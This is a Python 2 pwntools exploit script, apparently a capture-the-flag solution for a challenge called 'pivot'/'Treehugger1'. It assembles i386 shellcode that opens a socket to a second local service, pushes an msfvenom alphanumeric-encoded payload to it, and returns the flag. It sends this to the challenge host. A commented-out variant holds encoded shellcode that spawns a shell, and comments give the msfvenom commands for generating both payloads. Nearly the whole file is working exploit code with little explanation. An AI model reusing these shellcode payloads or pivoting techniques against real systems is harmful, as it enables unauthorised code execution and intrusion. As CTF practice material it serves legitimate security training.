#!/usr/bin/env python2
# -*- coding: utf-8 -*-

REMOTE=True

from pwn import *

#context(arch = "i386", os = "linux")
PROGRAM = "./pivot"

# Generate payload using: 
#    shellcraft i386.linux.sh | msfvenom --encoder x86/alpha_mixed --arch x86 --platform linux BufferRegister=EAX
#PIVOT_PAYLOAD="PYIIIIIIIIIIIIIIII7QZjAXP0A0AkAAQ2AB2BB0BBABXP8ABuJIpj1xSX4ovO4od3PhTorBU9pnk9IstqJi3Z4KPXny8Mk0AA"

# Generate payload using: 
#    shellcraft i386.linux.cat "flag"|  msfvenom --encoder x86/alpha_mixed --arch x86 --platform linux BufferRegister=EAX
PIVOT_PAYLOAD="PYIIIIIIIIIIIIIIII7QZjAXP0A0AkAAQ2AB2BB0BBABXP8ABuJICZ7qyn6lVDe8pfPlSQe7sZTEBxMYXcua8IZ9HMK0oyzaP1O0h0OKcZS1Ck0hiokOioQocnj9hMOpAA"


PIVOT_PAYLOAD+='\n'

TREE_PAYLOAD=flat(
	asm(shellcraft.i386.linux.connect('localhost', 11004)),
	asm(shellcraft.i386.dup2('edx', 999)), # Just to make sure that 999 is the socket file descriptor. But it can be assumed to be 3
	asm(shellcraft.i386.pushstr(PIVOT_PAYLOAD)),
	asm(shellcraft.i386.linux.write(999, 'esp', len(PIVOT_PAYLOAD))),
	asm(shellcraft.i386.linux.read(999, 'esp', len(PIVOT_PAYLOAD))), # Read the flag written to us
	asm(shellcraft.i386.linux.write(1, 'esp', len(PIVOT_PAYLOAD)))   # Write the flag to stdout
	)

if REMOTE:
	p = remote("ctf2016.the-playground.dk", 11001) #Treehugger1
	p.send(TREE_PAYLOAD)
else:
	p = process(PROGRAM)
	p.send(PIVOT_PAYLOAD)

print p.recvall()
